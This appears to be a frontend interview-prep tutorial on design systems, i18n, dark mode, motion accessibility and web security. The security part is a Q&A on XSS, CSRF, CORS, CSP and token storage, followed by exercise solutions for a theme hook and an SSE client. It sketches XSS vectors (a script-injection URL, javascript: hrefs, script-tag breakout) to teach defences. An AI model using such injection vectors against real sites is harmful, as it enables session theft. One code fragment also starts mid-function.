Rehearsable design answer — notifications feed: "Server-push only, low volume, text: SSE. Free auto-reconnect with Last-Event-ID resume, plain HTTP through every proxy and my existing auth cookie, multiplexes over H2. I'd add WebSockets only when the client needs to push at conversational rates — chat, presence, collab editing — and then I'd budget for the real costs: heartbeats, resume protocol, sticky routing or a pub/sub backplane, and drain-aware deploys."

9. Design systems & design tokens T2

Product companies ask this constantly ("you'd own our design system — how would you run it?"), and it's a system-design question in disguise: API design, versioning, distribution, and governance — applied to UI.

Token layers: primitive → semantic → component

Design tokens are named design decisions (color, spacing, type, radius, motion) stored as data, not hardcoded in components. The architecture that scales is a three-layer indirection: 

/* Layer 1 — primitives: the raw palette. No opinions, never used directly in components. */
--blue-500: #2563eb;
--gray-900: #111827;
--space-4:  1rem;

/* Layer 2 — semantic: meaning, not appearance. THE theming surface. */
--color-action-primary:  var(--blue-500);
--color-text-default:    var(--gray-900);
--color-surface-raised:  #ffffff;

/* Layer 3 — component: scoped decisions, derived from semantic. */
--button-primary-bg:     var(--color-action-primary);
--button-primary-radius: var(--radius-md);
  • Why the indirection earns its keep: dark mode, brand themes, and white-labeling become reassignments of layer 2 — components never change (§11). A rebrand that would be a 3-month grep becomes a token-file swap.
  • Naming discipline is the hard part: semantic names describe role (text-danger, surface-sunken), never appearance (red-text — which breaks the moment danger becomes orange in a theme).
  • Tokens live in a source-of-truth format (JSON/YAML — the W3C Design Tokens Community Group format is the emerging standard) and are built into platform outputs — CSS custom properties, TS constants, iOS/Android resources — with a transformer like Style Dictionary. One decision, every platform.

Theming architecture with custom properties

/* Themes are just scopes that reassign the semantic layer: */
:root                { --color-surface: #fff;    --color-text: #111827; }
[data-theme="dark"] { --color-surface: #111827; --color-text: #f9fafb; }
[data-brand="acme"]  { --color-action-primary: #7c3aed; }

/* Components read semantics — they are theme-unaware: */
.card { background: var(--color-surface); color: var(--color-text); }

Custom properties beat build-time theming (Sass variables, styled-components theme objects in JS) because they are runtime, cascade-scoped, and zero-rerender: switching data-theme restyles the page without touching React, and a subtree can carry its own theme (a dark sidebar in a light app) for free.

Component API consistency — the DS as an API surface

  • Shared prop grammar across every component: same size scale, same variant vocabulary, same controlled/uncontrolled conventions (value/defaultValue + onChange), events named uniformly. Consistency is the product — it's what makes the system learnable.
  • Prefer composition over prop explosion: <Card><Card.Header/><Card.Body/></Card> beats a 30-prop <Card> (tutorial 12's compound-component pattern earning its keep).
  • Bake in accessibility as non-negotiable behavior (focus management, ARIA, keyboard maps) — the strongest ROI argument for a DS: fix it once, every product inherits it. Headless libraries (Radix/React Aria) under styled skins is the common modern split.
  • Every component exposes token-driven styling hooks, not className free-for-all — otherwise consumers fork visually and the system decays.

Versioning & distribution

  • Semver with teeth: visual breaking changes and prop removals are majors; additive props are minors. Automate the discipline with changesets; ship codemods alongside breaking releases (the React team's playbook) so upgrades are mechanical, not archaeological.
  • Distribution trade-off: a published package gives consumers controlled adoption (they pin versions; you maintain N-1 support) — the default for multiple repos/teams. Monorepo source consumption gives atomic updates but couples every team to your main branch. In MFE setups (tutorial 15), the DS is usually a shared singleton dependency — version skew across remotes is a real coordination problem to name.
  • Deprecate loudly and gradually: console warnings in dev builds, a documented removal horizon, usage telemetry (scan repos for component/prop usage) to know when removal is safe.

Storybook as contract, governance as survival

  • Storybook is the living contract: every component, every state, in isolation — doubling as the documentation site, the manual QA surface, and the mount point for automated checks: visual regression (Chromatic-style snapshot diffs), a11y linting (axe per story), and interaction tests. A PR that changes a button's padding produces a visual diff a designer can approve — that's the design/engineering handshake, automated.
  • Governance models: a pure core team becomes a bottleneck; pure federation becomes entropy. The workable middle: a small core owning architecture/tokens/review, with a documented contribution model — product teams propose via RFC, build in their repo first ("incubate"), promote into the system when a second team needs it. Adoption is a product-management problem: measure it (token coverage, component usage), market it (changelogs, office hours), and make the system path easier than the bespoke path.
The interview framing that lands: "A design system is a product whose users are engineers and designers — so I'd run it like one: an API contract (components + tokens), semver + codemods for change management, Storybook + visual regression as CI, adoption metrics as the KPI, and a contribution process so it scales beyond the core team. The tokens are the schema; the components are the client library."

10. Internationalization T2

i18n questions test whether you've shipped beyond one locale — and the fastest way to fail one is to treat translation as string substitution. The core principle: translators translate whole messages, not fragments, because grammar lives at the sentence level.

Why string concatenation breaks translation

// Untranslatable — assumes English word order, pluralization, and spacing:
const msg = 'You have ' + count + ' new ' + (count === 1 ? 'message' : 'messages');

// German verb goes elsewhere; Arabic has SIX plural categories; Japanese has no
// plural inflection; French wants « 0 » treated as singular. Fragments can't adapt.

The fix is ICU MessageFormat: one complete message per key, with typed placeholders, and plural/gender logic inside the translatable string so each locale supplies its own grammar: 

"inbox.status": "{name} has {count, plural,
    =0    {no new messages}
    one   {# new message}
    other {# new messages}
  } since {lastLogin, date, medium}"

// CLDR defines up to six plural categories: zero / one / two / few / many / other.
// English uses two; Arabic uses all six; the translator — not your code — picks.

"invite.text": "{gender, select, female {She invited you} male {He invited you} other {They invited you}}"
  • Libraries (react-intl/FormatJS, i18next + ICU, Lingui) compile these; the runtime plural rules come from Intl.PluralRules — CLDR data shipped in the browser, not in your bundle.
  • Corollaries of "whole messages": never build sentences in JSX by interleaving translated fragments with markup — use rich-text placeholders ("See <link>the docs</link>"); never reuse one key in two contexts (the same English word declines differently elsewhere); give translators comments/screenshots as context.

The Intl toolbox — stop hand-formatting

const n = 1234567.891;
new Intl.NumberFormat('de-DE', { style: 'currency', currency: 'EUR' }).format(n);
// "1.234.567,89 €" — separators, symbol placement, decimals: all locale logic you didn't write

new Intl.DateTimeFormat('en-US', { dateStyle: 'medium', timeZone: 'Asia/Kolkata' }).format(new Date());
new Intl.RelativeTimeFormat('es', { numeric: 'auto' }).format(-1, 'day');   // "ayer"
new Intl.ListFormat('en', { type: 'conjunction' }).format(['a','b','c']); // "a, b, and c"

// Segmenter: the only correct way to count/slice user-perceived characters —
// "👨‍👩‍👧".length === 8, [...str] splits emoji; Segmenter respects grapheme clusters:
[...new Intl.Segmenter('en', { granularity: 'grapheme' }).segment('👨‍👩‍👧!')].length; // 2

// Also: Intl.Collator for locale-aware sorting (ä, é, ordering), Intl.PluralRules.
Truncating usernames with str.slice(0, 20) can cut an emoji or Devanagari cluster in half; sorting with arr.sort() puts "Ö" after "Z" for German users; toLocaleDateString() with no arguments silently uses the runtime's locale — an SSR hydration-mismatch generator (server formats in en-US UTC, client in the user's locale/zone). Always pass explicit locale + timeZone in isomorphic code.

RTL: direction is a layout dimension

  • Set <html dir="rtl" lang="ar"> — flow, alignment, and UA styles flip. But physical CSS fights it: margin-left: 8px stays left in a right-to-left layout.
  • CSS logical properties are the systemic fix — write direction-relative CSS once: margin-inline-start / padding-inline-end / inset-inline-start / border-start-start-radius, plus text-align: start. Flex/grid are direction-aware already. Stylelint can enforce logical-only.
  • Nuances that show real experience: directional icons (back arrows, "next" chevrons) must mirror, but brand marks, clocks, and media controls don't; numbers and embedded Latin stay LTR inside RTL text (the bidi algorithm handles it — wrap user-generated fragments in <bdi> so a Latin username doesn't scramble Arabic punctuation).

Locale routing, SSR, and bundle strategy

  • URL-visible locale (/de/pricing or de.example.com) beats cookie/header-only negotiation: shareable, cacheable (no Vary gymnastics), crawlable. Use Accept-Language only to suggest a redirect on first visit; let the user override and persist it; emit hreflang alternates for SEO.
  • SSR determinism: render with the locale and time zone resolved on the server from the request and pass them down explicitly, so server and client HTML agree (see the hydration pitfall above).
  • Lazy-load locale data: ship only the active locale's messages — import(`./locales/${locale}.json`) as a route-level split point (locale changes are rare; a reload is acceptable). Extraction tooling pulls messages from source at build time; pseudo-localization builds ("Ẅéļçöṁé ţö ţĥé àþþ ōņé ţŵö" — longer, accented) catch hardcoded strings and truncating layouts before translators do. Design for text expansion: German/Finnish routinely run 30–40% longer; fixed-width buttons and white-space: nowrap are the classic casualties.

11. Dark mode & theming T3

A deceptively rich practical question: it touches system preferences, FOUC-avoidance, storage, token architecture, and design judgment — in five minutes of interview time.

The platform primitives

/* React to the OS/browser preference: */
@media (prefers-color-scheme: dark) {
  :root { --color-surface: #111827; }
}

/* Tell the UA itself which schemes you support — form controls, scrollbars,
   and the default canvas follow without custom CSS: */
:root { color-scheme: light dark; }

/* Scheme-dependent values inline (2024+ platform feature): */
color: light-dark(#111827, #f9fafb);

prefers-color-scheme alone gives a two-state experience (follow the OS). Real products need three states — light / dark / system — because "follow my OS except this app" is a legitimate, common preference. That means a stored override plus a data attribute, and the media query only as the "system" fallback.

The no-FOUC toggle — the classic implementation question

The naive version reads localStorage in a useEffect — which runs after first paint, so dark-mode users get a white flash on every load. The fix is a tiny render-blocking inline script in <head>, before any content, so the attribute exists before first paint: 

<head>
  <script>
    // Inline + blocking ON PURPOSE: must run before first paint.
    // (Give it a CSP nonce or hash — ties back to §1.)
    (function () {
      try {
        var stored = localStorage.getItem('theme');        // 'light' | 'dark' | null
        var theme = stored ||
          (matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
        document.documentElement.dataset.theme = theme;
        document.documentElement.style.colorScheme = theme;
      } catch (e) { /* storage blocked → fall through to CSS default */ }
    })();
  </script>
  <link rel="stylesheet" href="/styles.css">
</head>
  • Store only the override: choosing "system" means removing the stored key, so future OS changes flow through. Listen to matchMedia('(prefers-color-scheme: dark)').addEventListener('change', …) to react live while in system mode.
  • SSR nuance: the server doesn't know the preference (localStorage is client-only), so either accept the inline-script approach (attribute set before paint, no flash) or persist the choice in a cookie so the server renders the right attribute directly. Sync across tabs via the storage event.
  • Set <meta name="color-scheme" content="light dark"> so even the pre-CSS blank page background matches — the last sliver of flash.

Semantic tokens make themes cheap

If §9's token architecture is in place, dark mode is one reassignment of the semantic layer under [data-theme="dark"] — zero component changes, and a future brand theme is the same shape of work. If components hardcode hex values, dark mode is a migration project. This is the interview link to make explicitly: "dark mode is trivial or terrible depending entirely on whether the token indirection exists."

Design judgment in dark mode (what seniors add)

  • Not inverted, re-lit: avoid pure black (#000) surfaces with pure white text — harsh halation; dark gray (#111–#1e) with off-white (~87% white) is the norm. Desaturate brand colors — saturated hues vibrate against dark; most palettes need lighter, softer variants to keep AA contrast (contrast requirements don't relax in the dark).
  • Elevation flips medium: shadows are nearly invisible on dark backgrounds — elevation is communicated by lighter surface color instead ("the higher, the lighter"), which is why surface/surface-raised/surface-overlay deserve separate tokens.
  • Images and media: pure-white backgrounds glare — options: <picture media="(prefers-color-scheme: dark)"> variants for illustrations/logos, a slight filter: brightness(.9) on photos, and transparent-background assets designed for both. Borders often need to get lighter relative to surfaces, not darker.

12. Motion, animation & accessibility T3

Motion accessibility is a small topic with outsized signal: it shows you think of animation as a user-facing contract, not decoration. The context that makes it concrete: for people with vestibular disorders (a substantial population — inner-ear balance dysfunction), large-scale motion — parallax, zooms, full-screen slides, scroll-linked effects — triggers genuine dizziness, nausea, and migraines. This is a health issue, not a preference.

prefers-reduced-motion — and why reduce ≠ remove

/* Feedback still matters — swap MOVEMENT for a fade, don't delete the cue: */
.toast { animation: slide-in-up 300ms ease-out; }

@media (prefers-reduced-motion: reduce) {
  .toast { animation: fade-in 150ms linear; }   /* still announces itself */
}

/* JS side — gate scroll-linked/JS-driven animation: */
const reduce = matchMedia('(prefers-reduced-motion: reduce)').matches;
el.scrollIntoView({ behavior: reduce ? 'auto' : 'smooth' });
  • The preference means "less, calmer, smaller" — removing all transitions can itself harm usability (state changes become teleports with no causality). Target the vestibular triggers: translation across large distances, scaling/zooming, parallax, spin. Opacity fades and small color transitions are generally fine to keep.
  • Two implementation stances: opt-out per animation (the media query above), or the blunt-but-safe global kill switch (animation-duration: 0.01ms !important under reduce) for codebases that can't audit every animation. In React, wrap matchMedia in a useSyncExternalStore-based usePrefersReducedMotion() hook and let motion components consume it; animation libraries (Framer Motion's MotionConfig reducedMotion="user") can honor it globally.
  • Autoplaying video/carousels: reduced motion is the signal to not autoplay; WCAG separately requires a pause/stop control for anything auto-moving longer than 5 s, and nothing may flash more than 3 times/second.

Performance is accessibility: compositor-friendly animation

Janky animation is its own accessibility failure (and an INP problem — tutorial 17). The rule set: animate only transform and opacity — compositor-thread properties that skip layout and paint and stay smooth while the main thread is busy; never animate top/left/width/height; will-change sparingly for known-upcoming animations. For "impossible" layout animations, know FLIP by name: First, Last, Invert, Play — measure the start and end positions, apply an inverting transform so the element appears unmoved, then animate the transform to zero. Layout cost happens once up front; the animation itself is pure compositor. This is what Framer Motion's layout animations and the spring-physics libraries do under the hood.

View Transitions API — the modern answer to "animate this navigation"

// Same-document (SPA) — browser snapshots old state, you mutate, it cross-fades:
document.startViewTransition(() => {
  root.render(<NextRoute />);                // any DOM update works
});

/* Pair elements across states for shared-element morphs: */
.card-thumb  { view-transition-name: hero-img; }
.detail-img  { view-transition-name: hero-img; }

/* And respect reduced motion — snapshots still swap, just without motion: */
@media (prefers-reduced-motion: reduce) {
  ::view-transition-group(*) { animation-duration: 0.01ms; }
}

Cross-document view transitions (opt-in via @view-transition) extend the same model to MPA navigations. Interview-level take: "shared-element transitions used to require FLIP gymnastics; the platform now snapshots and animates for me — I gate it on browser support and reduced motion." React Router and Next have integrations; it's progressive enhancement, so no fallback code is needed beyond not transitioning.

Focus and forced colors — the adjacent essentials

  • :focus-visible ended the "designers hate focus rings so we removed them" era: it matches only when the browser judges focus should be visible (keyboard/assistive navigation), not on mouse clicks. Pattern: :focus-visible { outline: 2px solid var(--color-focus); outline-offset: 2px; } — and never outline: none without a visible replacement. Note outline doesn't trigger layout — animating it is cheap.
  • Forced-colors mode (Windows High Contrast) discards your palette entirely and repaints with user-chosen system colors. Your CSS colors, shadows, and background images vanish — which breaks UI that communicates state through background color alone (toggle switches are the classic casualty). Test with the forced-colors: active media query and DevTools emulation; use semantic HTML (real <button>s get sensible system styling for free), keep borders on meaningful boundaries, and use SystemColor keywords (Canvas, ButtonText, Highlight) where you must intervene. forced-color-adjust: none exists for the rare element (color swatches) where your color IS the content.
The synthesis answer for "how do you approach animation in a product": "Motion has three contracts — purpose (it explains a state change, or it goes), performance (compositor-only properties, FLIP or View Transitions for layout morphs), and consent (reduced-motion users get the meaning without the movement). A design-system motion token set — durations, easings, distance scales — makes all three enforceable instead of aspirational."

Interview Q&A

1. Explain the three types of XSS with an example of each.

Reflected: payload in the request, echoed into the response — a crafted link like /search?q=<script>…</script> rendered into "results for…". Stored: payload persisted server-side (a comment, a profile bio) and served to every viewer — no link needed, wormable. DOM-based: never touches the server — a client-side source (location.hash, postMessage) flows into a sink (innerHTML, eval); the fragment isn't even sent to the server, so server defenses can't see it. Frame the impact: attacker JS in your origin means the SOP now works for them — session use, token exfiltration, keylogging.

2. "React prevents XSS" — attack that statement.

React escapes interpolated values rendered as content — one context. It does nothing for: dangerouslySetInnerHTML (including markdown/CMS HTML rendered through it), javascript: URLs in href/src (valid attribute value — the protocol is the attack; validate with new URL() against an allowlist), SSR state serialization (</script> inside JSON breaks out of the script tag — escape <), spread props smuggling dangerous attributes, and third-party components that accept raw HTML. The audit surface is exactly those escape hatches.

3. Design a strict CSP for a React SPA and explain each directive.

Nonce-based: script-src 'nonce-…' 'strict-dynamic' https: 'unsafe-inline'; object-src 'none'; base-uri 'none'; frame-ancestors 'self'; connect-src 'self' api.example.com; report-to csp. Per-response random nonce on legitimate script tags — injected scripts can't know it. 'strict-dynamic' lets nonced loaders inject chunks (bundler compatibility); the https: 'unsafe-inline' tail is ignored by modern browsers and only serves as legacy fallback. base-uri 'none' blocks <base> hijacks of relative URLs; connect-src limits exfiltration targets; report-only first, then enforce. Static hosting wrinkle: no server to mint nonces → hash the inline bootstrap or stamp nonces at the edge.

4. An XSS is found in production. Walk me through your response as frontend lead.

(1) Contain: if it's stored XSS, disable rendering of the affected content path (feature flag / kill switch); ship the sink fix — that's usually a one-liner once located. (2) Invalidate what's stolen: assume session/token theft for exposed users — rotate sessions, force re-auth, revoke refresh-token families; check whether tokens were exfiltratable (localStorage?) vs httpOnly. (3) Hunt siblings: the same pattern rarely exists once — grep every sink (dangerouslySetInnerHTML, innerHTML, URL props). (4) Harden: add/tighten CSP so the class is blast-radius-limited next time — and note CSP reports would have detected this earlier. (5) Postmortem: lint rules banning raw sinks, sanitization at a choke point, security review for HTML-rendering features. Mentioning user notification/compliance obligations is a bonus signal.

5. Explain CSRF and why your JWT-in-header API "isn't vulnerable." Is that the whole story?

CSRF = attacker page makes the victim's browser send a state-changing request that rides automatically attached credentials — i.e., cookies. A bearer token in Authorization must be attached by your JS, which an attacker's page can't do (custom headers require CORS-approved fetch, and they can't read the token anyway) — so header-auth APIs are inherently CSRF-resistant. The "whole story" caveats: the moment anyone adds cookie auth "just for SSR" or puts the JWT in a cookie, CSRF is back; the login form still needs protection (login CSRF); and where the SPA gets the token (refresh-cookie endpoint) is itself cookie-authenticated and needs SameSite/origin checks.

6. SameSite=Lax is the default now. Are we done with CSRF defenses?

No — Lax has known gaps: it still sends cookies on top-level GET navigations, so any state-changing GET endpoint remains exploitable via a plain link; "site" is eTLD+1, so any sibling subdomain (or a subdomain takeover) is same-site and unrestricted; some browsers had a 2-minute "Lax+POST" grace window; and you don't control every client's browser/config. Defense-in-depth stance: SameSite as the platform baseline, plus an application-level check — anti-CSRF token, custom-header requirement, or Sec-Fetch-Site validation — on every mutation, and strict GET/POST semantics.

7. Walk me through exactly what happens when a CORS preflight fails.

The browser classified the request as non-simple (method beyond GET/HEAD/POST, or a custom header, or a content type beyond form/text) and sent OPTIONS with Origin, Access-Control-Request-Method, and Access-Control-Request-Headers — no body, no credentials. The server's response failed the check: missing/mismatched Access-Control-Allow-Origin, method or header not listed, non-2xx status, or a redirect (preflights must not redirect). Consequence: the actual request is never sent. JS gets a generic TypeError: Failed to fetch — deliberately opaque; the specific reason is only in the console/Network panel. Fix on the server (or gateway): answer OPTIONS with the right allow-headers, add Access-Control-Max-Age to cache the verdict, and remember error responses need CORS headers too or clients can't even read failures.

8. Why can't you use Access-Control-Allow-Origin: * with credentials, and what's the equally bad workaround?

With credentials: 'include', responses carry the user's authenticated data; * would mean "any website on the internet may read this user's data via their browser" — so the spec forbids the combination (and wildcards in allow-headers/methods too). The equally bad workaround is echoing the request's Origin back unvalidated with Allow-Credentials: true — functionally identical to the forbidden wildcard. Correct: validate the origin against an allowlist, echo only if it matches, and send Vary: Origin so caches don't serve one origin's CORS verdict to another.

9. "CORS is blocking my request — the API is protected, right?" Correct the misconception.

CORS protects users, not servers. Simple cross-origin requests are sent and processed — only the response read is blocked in the browser; and nothing about CORS applies to curl, Postman, or a server-side attacker. What CORS prevents is a malicious website using a victim's browser — with the victim's cookies and network position — to read your API's responses. Server protection is authn/authz, rate limiting, CSRF defense. Corollary: loosening CORS never "opens your API to hackers" directly — it endangers your users' data via their own browsers.

10. Argue localStorage vs cookies for a JWT — both sides, then commit.

localStorage: CSRF-immune (you attach the header), simple, no SameSite gymnastics — but readable by any injected script, so XSS becomes credential exfiltration: offline replay, persists past the session, sellable. httpOnly cookie: not readable by JS, so XSS is limited to session riding while the victim's page is open — bounded and revocable — but you inherit CSRF (answerable: SameSite + tokens) and 4 KB/every-request costs. Both lose under XSS, but they lose asymmetrically: exfiltration is strictly worse, and CSRF has platform-level answers while readable storage has none. Commit: short-lived access token in memory + rotating refresh token in a path-scoped httpOnly SameSite=Strict cookie; BFF (no tokens in the browser) when the bar is higher.

11. What is refresh-token rotation and what attack does reuse detection catch?

Every call to the refresh endpoint returns a new refresh token and invalidates the one just used — tokens are single-use links in a chain (a "family"). If a refresh token is stolen, both the attacker and the legitimate user eventually present the same token; whichever presents second is using an already-rotated token. That reuse is unambiguous evidence of theft → the server revokes the entire family, forcing re-authentication for both parties. So rotation converts "silent long-term compromise" into "detected incident with bounded damage" — the reason OAuth security BCPs mandate it for browser clients.

12. Why is the implicit OAuth flow deprecated, and what does PKCE actually prove?

Implicit returned tokens in the URL fragment: exposed to browser history, referrer leakage, extensions, and shoulder-surfing logs, with no client authentication and no rotation-friendly code exchange. Authorization Code + PKCE fixes it: the client generates a random code_verifier, sends its SHA-256 hash (code_challenge) with the initial redirect, and must present the original verifier at the token exchange. An attacker who intercepts the redirect (or reads the code from a log) can't redeem it — they can't invert the hash. PKCE proves the same client that started the flow is finishing it, replacing the client secret that a public browser app can never keep.

13. What do COOP and COEP do, and when did you last need them?

They establish cross-origin isolation. COOP same-origin severs window references with cross-origin openers/popups so your page gets its own browsing-context group (own process); COEP require-corp refuses to load any embedded resource that hasn't opted in via CORS/CORP. Both set → crossOriginIsolated === true, which unlocks SharedArrayBuffer and precise timers (gated post-Spectre, since speculative execution reads process memory). The "when": adopting anything WASM-multithreaded — ffmpeg.wasm, SQLite-wasm, pthreads builds — which fails without them; the migration cost is that every cross-origin asset now needs CORS/CORP headers, and COOP can break window.opener-based OAuth popups (same-origin-allow-popups).

14. no-cache vs no-store vs immutable — precise definitions.

no-cache: may store, must revalidate before every use — with an ETag that's a cheap conditional request and a 304, not a re-download. no-store: never write to any cache — the actual "don't cache," for sensitive responses (and it disqualifies the document from bfcache — don't blanket it). immutable: "this URL's bytes will never change — skip revalidation even on reload," correct only for content-hashed URLs where the URL is the version. The classic confusion — thinking no-cache means "don't cache" — is exactly what the question screens for.

15. Design the caching strategy for a SPA release. What makes deploys atomic?

Content-hash every built asset and serve /assets/* with public, max-age=31536000, immutable; serve HTML with no-cache + ETag (or max-age=0, s-maxage=300, stale-while-revalidate=60 to let the CDN absorb load); authenticated API responses private/no-store. Atomicity: HTML is the single mutable pointer — a deploy publishes new hashed assets then new HTML referencing them; users get either the complete old graph or the complete new one, never a mix. Keep the previous build's assets available for in-flight sessions and lazy-loaded chunks (a freshly-purged CDN + old open tab = chunk 404s — handle with a reload-on-chunk-error boundary). No purges, no version skew, repeat visits cost zero asset requests.

16. Your load balancer serves stale CORS headers to the wrong origin sometimes. What's missing?

Vary: Origin. The CDN/proxy caches responses by URL; if the response's Access-Control-Allow-Origin is computed per-request (echoed from an allowlist), two origins share one cache entry — origin B receives the copy stamped for origin A and the browser blocks the read (intermittently, per-edge-node, which is why it's maddening to debug). Declaring Vary: Origin partitions the cache key by requesting origin. Same family of bug: missing Vary: Accept-Encoding serving brotli to gzip-only clients, or varying on Cookie accidentally disabling shared caching entirely.

17. What did HTTP/2 fix, what did it not fix, and how does HTTP/3 finish the job?

H2 fixed application-layer head-of-line blocking: binary framing multiplexes many streams over one TCP connection (plus HPACK header compression and priorities), obsoleting sharding/spriting/concatenation. It could not fix TCP's HOL: TCP delivers one ordered byte stream, so a single lost packet stalls every stream until retransmission — on lossy mobile networks H2 can underperform six H1.1 connections. H3 moves to QUIC over UDP: reliability is per-stream, so loss stalls only the affected stream; TLS 1.3 is integrated (1-RTT, 0-RTT resumption — idempotent-only due to replay); and connection IDs survive network switches (Wi-Fi→LTE without re-handshake). Bonus currency: H2 Server Push is dead (Chrome removed it) — 103 Early Hints took its use case.

18. "HTTP/2 made bundling obsolete." Take a position.

False, and quantifiably so. Multiplexing removed the per-connection cost of many files, but: compression works dramatically better across one large file than 2,000 independently-compressed modules; unbundled module graphs create discovery waterfalls (import depth = sequential round trips) unless you preload the entire graph; and per-request scheduling/cache-lookup overhead still exists. What H2/H3 actually changed is the optimum: from one monolith to a few dozen route/vendor chunks — fine enough that one change doesn't invalidate the whole cache, coarse enough to compress and schedule well. Codebase-wide no-bundling (dev-mode Vite style) is a dev-experience tool, not a production strategy.

19. SSE vs WebSocket for a notifications feed — decide and defend.

SSE. The data flow is server→client only, low-volume, text — WebSocket's bidirectionality buys nothing. SSE rides plain HTTP: existing cookie auth just works, every proxy/LB passes it, it multiplexes over H2/H3, and EventSource gives auto-reconnect with Last-Event-ID — the "what did I miss" resume protocol — for free; on WebSocket you'd hand-build reconnect, heartbeat, and resume. Flip to WebSocket when the client pushes at conversational rates (chat, typing indicators, collab editing) or needs binary frames. Mention the caveats that show experience: anti-buffering config for SSE through proxies, heartbeat comments through idle timeouts, and a pub/sub backplane once you have multiple server nodes.

20. Two users on different servers — how does A's message reach B's WebSocket?

Server nodes must not be the source of truth for who-hears-what. Standard shape: nodes are dumb pipes; each holds its local sockets and subscribes to a pub/sub backplane (Redis pub/sub, Kafka, NATS). A's node publishes the message to the channel/topic; every subscribed node receives it and forwards to its own connected sockets (B's node → B). Complementary pieces: presence/routing table if you need targeted delivery, sticky sessions only for connection affinity (not state), connection draining on deploys, and a replay buffer keyed by sequence ID so reconnecting clients can resume. This paragraph is the expected answer to the scaling half of any realtime design question.

21. What are design tokens, and why three layers instead of one?

Named design decisions stored as data (JSON → built into CSS custom properties/TS/native resources). Layers: primitives (raw palette: blue-500) → semantic (role: color-action-primary) → component (button-primary-bg). One flat layer couples components to raw values, so a rebrand or dark mode is a codebase-wide migration; with the semantic indirection, themes are reassignments of layer 2 under a scope ([data-theme]) — zero component changes. Discipline that makes it work: semantic names describe role, never appearance (text-danger, not red-text), and components consume only layers 2–3.

22. How do you version and evolve a design system consumed by 20 teams without breaking them?

Treat it as a product with an API contract: strict semver (visual breaking changes are majors), changesets automating versioning/changelogs, deprecation with dev-time warnings and a published removal horizon, and codemods shipped with breaking releases so migration is mechanical. Distribution as a versioned package so teams adopt on their schedule (support N-1); usage telemetry to know what's actually consumed before removing anything. Storybook + visual regression as the CI contract — a padding change produces a reviewable visual diff. Governance: small core team owns tokens/architecture; product teams contribute via a documented incubate→promote path so the system scales without becoming a bottleneck or a dumping ground.

23. Why does string concatenation break translation, and what's the fix?

Concatenation hardcodes English grammar: word order (German verbs move), pluralization (Arabic has six CLDR plural categories; Japanese doesn't inflect), gender agreement, and spacing conventions. Translators need the whole sentence to produce correct grammar. Fix: ICU MessageFormat — one complete message per key with typed placeholders and plural/select logic inside the translatable string: {count, plural, one {# message} other {# messages}}; each locale supplies its own branches via Intl.PluralRules. Corollaries: no key reuse across contexts, rich-text placeholders instead of JSX fragment stitching, and Intl.* (NumberFormat/DateTimeFormat/Segmenter/Collator) instead of hand-formatting numbers, dates, string lengths, and sort orders.

24. Implement a dark-mode toggle with no flash of the wrong theme. Where does the code run?

The deciding code must run before first paint, so it's a tiny render-blocking inline script in <head> (with a CSP nonce/hash): read localStorage.theme; if absent, fall back to matchMedia('(prefers-color-scheme: dark)'); set data-theme and style.colorScheme on <html>. A useEffect version runs after paint → white flash for dark users. Three states matter: light/dark/system, where "system" = remove the stored key and follow a matchMedia change listener live. SSR: either accept the inline-script approach or store the choice in a cookie so the server renders the attribute. CSS side: semantic tokens reassigned under [data-theme="dark"], plus color-scheme so form controls and scrollbars follow.

25. How would you architect dark mode so designers can add a brand theme next year?

Make "dark" the second theme, not a special case: components consume only semantic tokens (--color-surface, --color-action-primary) via CSS custom properties; a theme is a scope that reassigns them ([data-theme="dark"], later [data-brand="acme"] — attributes compose, so acme-dark falls out for free). The token source of truth lives in JSON with a build step emitting each theme's CSS; adding a brand = adding a token file and design QA, zero component edits. Guardrails that keep it true: lint against raw hex in components, semantic (role-based) token names, contrast checks per theme in CI, and separate elevation/surface tokens because dark mode communicates depth with lighter surfaces, not shadows.

26. What does prefers-reduced-motion actually require of you? Is removing all animation correct?

It signals that motion physically harms the user — vestibular disorders make parallax, zooms, and large translations cause dizziness and nausea. "Reduce" ≠ "remove": deleting all transitions turns state changes into causeless teleports, which hurts comprehension. Correct: neutralize the vestibular triggers (large movement, scaling, parallax, autoplay) and keep or substitute gentle cues — a slide becomes a fade, smooth scroll becomes instant, carousels stop autoplaying. Implementation: the @media (prefers-reduced-motion: reduce) block per animation (or a global duration-kill fallback), matchMedia gating for JS/scroll-linked animation, and honoring it inside View Transitions and animation libraries. Adjacent WCAG facts: pause control for anything auto-moving > 5 s, no flashing > 3×/second.

    };
    apply();
    mq.addEventListener('change', apply);                 // live OS tracking in system mode
    const onStorage = (e) => {                            // cross-tab sync
      if (e.key === 'theme') setPref(e.newValue ?? 'system');
    };
    addEventListener('storage', onStorage);
    return () => { mq.removeEventListener('change', apply); removeEventListener('storage', onStorage); };
  }, [pref]);

  const setTheme = (next) => {          // 'light' | 'dark' | 'system'
    next === 'system' ? localStorage.removeItem('theme')   // system = ABSENCE of override
                       : localStorage.setItem('theme', next);
    setPref(next);
  };
  return { theme: pref, setTheme };
}

Why not useEffect for the initial application: effects run after React commits and the browser has painted — a dark-mode user gets one light-themed frame (or many, on slow devices) every load. The decision must be render-blocking, which is exactly the one legitimate use of a blocking inline head script.

Exercise 3 — SSE client with reconnect + resume

Build a notifications client on EventSource: parse JSON events, survive server restarts, resume missed events after disconnection, and fall back to giving up gracefully after repeated failures. Then note what the server must do to make resume work — and when you'd need to abandon EventSource for a fetch-stream.

Solution 
function connectNotifications({ onEvent, maxRetries = 8 }) {
  let es, failures = 0, closedByUs = false;

  function open() {
    es = new EventSource('/api/notifications');   // cookies ride along; custom headers impossible

    es.onopen = () => { failures = 0; };            // healthy again — reset backoff

    es.addEventListener('notification', (e) => {
      // e.lastEventId is set from the "id:" field — the browser REMEMBERS it and
      // sends "Last-Event-ID: <id>" automatically on every auto-reconnect.
      onEvent(JSON.parse(e.data));
    });

    es.onerror = () => {
      // EventSource auto-reconnects on transient errors (honoring "retry:").
      // readyState CLOSED means it gave up (e.g. HTTP 4xx/5xx) — then WE own retry:
      if (es.readyState === EventSource.CLOSED && !closedByUs) {
        if (++failures > maxRetries) return onEvent({ type: 'degraded' }); // surface to UI, offer refresh
        const delay = Math.min(30000, 1000 * 2 ** failures) * (0.5 + Math.random()); // jittered backoff
        setTimeout(open, delay);
      }
    };
  }
  open();
  return () => { closedByUs = true; es.close(); };  // cleanup for the React effect
}

